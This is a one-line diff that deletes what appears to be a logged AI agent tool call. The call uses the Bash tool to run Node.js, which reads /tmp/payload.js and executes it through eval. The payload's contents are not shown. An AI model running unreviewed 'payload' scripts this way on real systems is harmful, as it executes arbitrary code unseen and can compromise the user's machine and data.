@@ -1,1 +1,0 @@
-{"type":"tool_use","id":"toolu_19","name":"Bash","input":{"command":"node -e \"eval(require('fs').readFileSync('/tmp/payload.js','utf8'))\""}}
